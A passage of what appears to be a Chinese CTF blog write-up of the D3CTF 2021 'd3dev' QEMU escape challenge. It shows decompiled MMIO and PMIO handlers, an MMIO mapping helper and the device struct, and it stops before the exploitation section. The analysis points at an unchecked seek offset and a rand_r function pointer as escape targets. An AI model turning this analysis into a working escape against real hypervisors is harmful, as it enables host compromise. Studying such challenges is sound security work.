@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="描述d3devState结构体： d3devState struct __attribute__((aligned(16))) {     PCIDevice_0 pdev;     MemoryRegion_0 mmio;     MemoryRegion_0 pmio;     uint32_t memory_mode;     uint32_t seek;     uint32_t init">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D3ctf-2021-Qualifier-Pwn-D3dev">
+<meta property="og:url" content="http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/index.html">
+<meta property="og:site_name" content="1nv0k3r&#39;s blog">
+<meta property="og:description" content="描述d3devState结构体： d3devState struct __attribute__((aligned(16))) {     PCIDevice_0 pdev;     MemoryRegion_0 mmio;     MemoryRegion_0 pmio;     uint32_t memory_mode;     uint32_t seek;     uint32_t init">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://1nv0k3r.fun/2021/04/15/images/d3ctf-2021-qualifier-pwn-d3dev/2021-03-10-01-03-59.png">
+<meta property="og:image" content="http://1nv0k3r.fun/2021/04/15/images/d3ctf-2021-qualifier-pwn-d3dev/2021-03-11-20-46-58.png">
+<meta property="article:published_time" content="2021-04-15T06:13:34.000Z">
+<meta property="article:modified_time" content="2021-04-15T06:22:06.745Z">
+<meta property="article:author" content="1nv0k3r">
+<meta property="article:tag" content="pwn qemu">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1nv0k3r.fun/2021/04/15/images/d3ctf-2021-qualifier-pwn-d3dev/2021-03-10-01-03-59.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>D3ctf-2021-Qualifier-Pwn-D3dev</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/04/15/pwnable-tw%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&text=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&is_video=false&description=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=D3ctf-2021-Qualifier-Pwn-D3dev&body=Check out this article: http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&title=D3ctf-2021-Qualifier-Pwn-D3dev"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.fun/2021/04/15/d3ctf-2021-qualifier-pwn-d3dev/&name=D3ctf-2021-Qualifier-Pwn-D3dev&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#描述"><span class="toc-number">1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MMIO"><span class="toc-number">2.1.</span> <span class="toc-text">MMIO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-mmio-read"><span class="toc-number">2.1.1.</span> <span class="toc-text">d3dev_mmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-mmio-write"><span class="toc-number">2.1.2.</span> <span class="toc-text">d3dev_mmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编程访问MMIO"><span class="toc-number">2.1.3.</span> <span class="toc-text">编程访问MMIO</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PMIO"><span class="toc-number">2.2.</span> <span class="toc-text">PMIO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-pmio-read"><span class="toc-number">2.2.1.</span> <span class="toc-text">d3dev_pmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-pmio-write"><span class="toc-number">2.2.2.</span> <span class="toc-text">d3dev_pmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编程访问pmio"><span class="toc-number">2.2.3.</span> <span class="toc-text">编程访问pmio</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">5.</span> <span class="toc-text">Reference</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        D3ctf-2021-Qualifier-Pwn-D3dev
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">1nv0k3r's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-15T06:13:34.000Z" itemprop="datePublished">2021-04-15</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/pwn-qemu/" rel="tag">pwn qemu</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>d3devState结构体：</p>
+<pre><code>d3devState
+struct __attribute__((aligned(16))) {
+    PCIDevice_0 pdev;
+    MemoryRegion_0 mmio;
+    MemoryRegion_0 pmio;
+    uint32_t memory_mode;
+    uint32_t seek;
+    uint32_t init_flag;                 ; 标志是否初始化
+    uint32_t mmio_read_part;
+    uint32_t mmio_write_part;
+    uint32_t r_seed;
+    uint64_t blocks[257];
+    uint32_t key[4];                    ; 4个随机数（rand()）
+    int (*rand_r)(unsigned int *);
+}
+</code></pre><p>pci_d3dev_realize:</p>
+<pre><code>void __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)
+{
+memory_region_init_io(
+    (MemoryRegion_0 *)&amp;pdev[1],
+    &amp;pdev-&gt;qdev.parent_obj,
+    &amp;d3dev_mmio_ops,
+    pdev,
+    &quot;d3dev-mmio&quot;,
+    0x800uLL);
+pci_register_bar(pdev, 0, 0, (MemoryRegion_0 *)&amp;pdev[1]);
+memory_region_init_io(
+    (MemoryRegion_0 *)&amp;pdev[1].name[56],
+    &amp;pdev-&gt;qdev.parent_obj,
+    &amp;d3dev_pmio_ops,
+    pdev,
+    &quot;d3dev-pmio&quot;,
+    0x20uLL);
+pci_register_bar(pdev, 1, 1u, (MemoryRegion_0 *)&amp;pdev[1].name[56]);
+}
+</code></pre><p>可以看到mmio操作结构体<code>d3dev_mmio_ops</code>，大小0x800，pmoi操作结构体<code>d3dev_pmio_ops</code>，大小0x20</p>
+<p>void __fastcall d3dev_instance_init(Object_0 <em>obj)<br>{<br>  d3devState </em>v1; // rbx<br>  unsigned int v2; // eax<br>  int v3; // eax</p>
+<p>  v1 = (d3devState <em>)object_dynamic_cast_assert(<br>                       obj,<br>                       “d3dev”,<br>                       “/home/eqqie/CTF/qemu-escape/qemu-source/qemu-3.1.0/hw/misc/d3dev.c”,<br>                       213,<br>                       “d3dev_instance_init”);<br>  v1-&gt;rand_r = (int (</em>)(unsigned int *))&amp;rand_r;<br>  if ( !v1-&gt;init_flag )<br>  {<br>    v2 = time(0LL);<br>    srand(v2);<br>    v1-&gt;key[0] = rand();<br>    v1-&gt;key[1] = rand();<br>    v1-&gt;key[2] = rand();<br>    v3 = rand();<br>    v1-&gt;init_flag = 1;<br>    v1-&gt;key[3] = v3;<br>  }<br>}</p>
+<p>接下来看mmio和pmio的操作</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h3><h4 id="d3dev-mmio-read"><a href="#d3dev-mmio-read" class="headerlink" title="d3dev_mmio_read"></a>d3dev_mmio_read</h4><p>已知key[0-3]是一组随机数，addr是我们传进来的地址，在如下循环中</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">  v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">  v4 += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v4 );</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_mmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;blocks[opaque-&gt;<span class="built_in">seek</span> + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>)];</span><br><span class="line">  v4 = <span class="number">0xC6EF3720</span>;</span><br><span class="line">  v5 = v3;</span><br><span class="line">  result = HIDWORD(v3);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(result) = result - ((v5 + v4) ^ (opaque-&gt;key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">    v5 -= (result + v4) ^ (opaque-&gt;key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (opaque-&gt;key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">    v4 += <span class="number">0x61C88647</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 );</span><br><span class="line">  <span class="keyword">if</span> ( opaque-&gt;mmio_read_part )</span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">0</span>;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    opaque-&gt;mmio_read_part = <span class="number">1</span>;</span><br><span class="line">    result = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="d3dev-mmio-write"><a href="#d3dev-mmio-write" class="headerlink" title="d3dev_mmio_write"></a>d3dev_mmio_write</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">d3dev_mmio_write</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  ObjectClass_0 **v5; <span class="comment">// r11</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v8; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v9; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v10; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">uint32_t</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">uint64_t</span> v13; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = opaque-&gt;<span class="built_in">seek</span> + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(addr &gt;&gt; <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( opaque-&gt;mmio_write_part )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;opaque-&gt;pdev.qdev.parent_obj.class + v4;</span><br><span class="line">      v6 = val &lt;&lt; <span class="number">32</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">0</span>;</span><br><span class="line">      v8 = opaque-&gt;key[<span class="number">0</span>];</span><br><span class="line">      v9 = opaque-&gt;key[<span class="number">1</span>];</span><br><span class="line">      v10 = opaque-&gt;key[<span class="number">2</span>];</span><br><span class="line">      v11 = opaque-&gt;key[<span class="number">3</span>];</span><br><span class="line">      v12 = v6 + *((_DWORD *)v5 + <span class="number">0x2B6</span>);</span><br><span class="line">      v13 = ((<span class="keyword">unsigned</span> __int64)v5[<span class="number">0x15B</span>] + v6) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 -= <span class="number">0x61C88647</span>;</span><br><span class="line">        v12 += (v7 + v13) ^ (v9 + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v13 &gt;&gt; <span class="number">5</span>)) ^ (v8 + <span class="number">16</span> * v13);</span><br><span class="line">        LODWORD(v13) = ((v7 + v12) ^ (v11 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v10 + <span class="number">16</span> * v12)) + v13;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v7 != <span class="number">0xC6EF3720</span> );</span><br><span class="line">      v5[<span class="number">347</span>] = (ObjectClass_0 *)__PAIR64__(v13, v12);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;mmio_write_part = <span class="number">1</span>;</span><br><span class="line">      opaque-&gt;blocks[v4] = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="编程访问MMIO"><a href="#编程访问MMIO" class="headerlink" title="编程访问MMIO"></a>编程访问MMIO</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint32_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = <span class="built_in">open</span>(<span class="string">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h3><h4 id="d3dev-pmio-read"><a href="#d3dev-pmio-read" class="headerlink" title="d3dev_pmio_read"></a>d3dev_pmio_read</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">d3dev_pmio_read</span><span class="params">(d3devState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0x18</span> )</span><br><span class="line">    result = <span class="number">-1L</span>L;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = ((__int64 (__fastcall *)(d3devState *))((<span class="keyword">char</span> *)dword_7ADF30 + dword_7ADF30[addr]))(opaque);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里实际上有一波混淆，汇编里是这样的：</p>
+<pre><code>.text:00000000004D7D00 ; uint64_t __fastcall d3dev_pmio_read(d3devState *opaque, hwaddr addr, unsigned int size)
+.text:00000000004D7D00 d3dev_pmio_read proc near               ; DATA XREF: .data.rel.ro:d3dev_pmio_ops↓o
+.text:00000000004D7D00 addr = rsi                              ; hwaddr
+.text:00000000004D7D00 size = rdx                              ; unsigned int
+.text:00000000004D7D00 opaque = rdi                            ; void *
+.text:00000000004D7D00 ; __unwind {
+.text:00000000004D7D00                 endbr64
+.text:00000000004D7D04 d3dev = rdi                             ; d3devState *
+.text:00000000004D7D04                 cmp     addr, 18h
+.text:00000000004D7D08                 ja      short loc_4D7D20
+.text:00000000004D7D0A                 lea     size, table
+.text:00000000004D7D11                 movsxd  rax, dword ptr [rdx+addr*4]
+.text:00000000004D7D15                 add     rax, rdx
+.text:00000000004D7D18                 db      3Eh
+.text:00000000004D7D18                 jmp     rax
+.text:00000000004D7D18 ; ---------------------------------------------------------------------------
+.text:00000000004D7D1B                 align 20h
+.text:00000000004D7D20
+.text:00000000004D7D20 loc_4D7D20:                             ; CODE XREF: d3dev_pmio_read+8↑j
+.text:00000000004D7D20                 mov     rax, 0FFFFFFFFFFFFFFFFh
+.text:00000000004D7D27                 retn
+.text:00000000004D7D27 d3dev_pmio_read endp
+.text:00000000004D7D27
+.text:00000000004D7D27 ; ---------------------------------------------------------------------------
+.text:00000000004D7D28                 align 10h
+.text:00000000004D7D30                 mov     eax, [rdi+12ECh]
+.text:00000000004D7D36                 retn
+.text:00000000004D7D36 ; ---------------------------------------------------------------------------
+.text:00000000004D7D37                 align 20h
+.text:00000000004D7D40                 mov     eax, [rdi+0AC0h]
+.text:00000000004D7D46                 retn
+.text:00000000004D7D46 ; ---------------------------------------------------------------------------
+.text:00000000004D7D47                 align 10h
+.text:00000000004D7D50                 mov     eax, [rdi+0AC4h]
+.text:00000000004D7D56                 retn
+.text:00000000004D7D56 ; ---------------------------------------------------------------------------
+.text:00000000004D7D57                 align 20h
+.text:00000000004D7D60                 mov     eax, [rdi+12E0h]
+.text:00000000004D7D66                 retn
+.text:00000000004D7D66 ; ---------------------------------------------------------------------------
+.text:00000000004D7D67                 align 10h
+.text:00000000004D7D70                 mov     eax, [rdi+12E4h]
+.text:00000000004D7D76                 retn
+.text:00000000004D7D76 ; ---------------------------------------------------------------------------
+.text:00000000004D7D77                 align 20h
+.text:00000000004D7D80                 mov     eax, [rdi+12E8h]
+.text:00000000004D7D86                 retn
+.text:00000000004D7D86 ; } // starts at 4D7D00
+</code></pre><p>table以32位显示是这样的：</p>
+<pre><code>.rodata:00000000007ADF30                ; int table[28]
+.rodata:00000000007ADF30 10 9E D2 FF    table           dd 0FFD29E10h           ; DATA XREF: d3dev_pmio_read+A↑o
+.rodata:00000000007ADF34 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF38 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF3C F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF40 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF44 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF48 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF4C F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF50 20 9E D2 FF                    dd 0FFD29E20h
+.rodata:00000000007ADF54 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF58 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF5C F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF60 30 9E D2 FF                    dd 0FFD29E30h
+.rodata:00000000007ADF64 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF68 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF6C F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF70 40 9E D2 FF                    dd 0FFD29E40h
+.rodata:00000000007ADF74 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF78 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF7C F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF80 50 9E D2 FF                    dd 0FFD29E50h
+.rodata:00000000007ADF84 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF88 F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF8C F0 9D D2 FF                    dd 0FFD29DF0h
+.rodata:00000000007ADF90 00 9E D2 FF 00+                dq 0FFD29E00h
+.rodata:00000000007ADF98 00 00 00 00 00+                dq 0
+</code></pre><p><img src="../images/d3ctf-2021-qualifier-pwn-d3dev/2021-03-10-01-03-59.png" alt=""></p>
+<p>流程就是，首先假设我们传进来的addr是0，那么获取table[0]，由指令movsxd运算，将32位的<code>0xFFD29E10</code>扩展为64位地址，</p>
+<p>高位用符号位补齐，即扩展为<code>0xFFFFFFFFFFD29E10</code>，然后再加上前面lea读取的table的地址，即<code>00000000007ADF30</code>这个地址，</p>
+<p>得到目标地址<code>0x100000000004d7d40</code>，即：</p>
+<pre><code>.text:00000000004D7D40 8B 87 C0 0A 00+                mov     eax, [rdi+0AC0h]
+.text:00000000004D7D40 00
+.text:00000000004D7D46 C3                             retn
+</code></pre><p>据此我们可以把table中的全部地址计算出目标地址，以及对应的addr：</p>
+<pre><code>0FFD29E00h -&gt; 0x100000000004d7d30 -&gt; 0x18
+0FFD29E10h -&gt; 0x100000000004d7d40 -&gt; 0x00
+0FFD29E20h -&gt; 0x100000000004d7d50 -&gt; 0x08
+0FFD29E30h -&gt; 0x100000000004d7d60 -&gt; 0x0c
+0FFD29E40h -&gt; 0x100000000004d7d70 -&gt; 0x10
+0FFD29E50h -&gt; 0x100000000004d7d80 -&gt; 0x14
+0FFD29DF0h -&gt; 0x100000000004d7d20 -&gt; check failed
+</code></pre><p>实际上根据出现次数也能看出来，0FFD29DF0h会跳转到</p>
+<pre><code>.text:00000000004D7D20 48 C7 C0 FF FF+                mov     rax, 0FFFFFFFFFFFFFFFFh
+.text:00000000004D7D20 FF FF
+.text:00000000004D7D27 C3                             retn
+</code></pre><p>即check failed的块，所以我们的addr只能是0x20/4，0x30/4，0x40/4，0x50/4，0x60/4，即0x8，0xc，0x10，0x14，0x18</p>
+<pre><code>00000000 d3devState      struc ; (sizeof=0x1300, align=0x10, copyof_4545)
+00000000 pdev            PCIDevice_0 ?
+000008E0 mmio            MemoryRegion_0 ?
+000009D0 pmio            MemoryRegion_0 ?
+00000AC0 memory_mode     dd ?
+00000AC4 seek            dd ?
+00000AC8 init_flag       dd ?
+00000ACC mmio_read_part  dd ?
+00000AD0 mmio_write_part dd ?
+00000AD4 r_seed          dd ?
+00000AD8 blocks          dq 257 dup(?)
+000012E0 key             dd 4 dup(?)             ; 4个double word，1个是4字节，即12e0，12e4，12e8，12ec
+000012F0 rand_r          dq ?                    ; offset
+000012F8                 db ? ; undefined
+000012F9                 db ? ; undefined
+000012FA                 db ? ; undefined
+000012FB                 db ? ; undefined
+000012FC                 db ? ; undefined
+000012FD                 db ? ; undefined
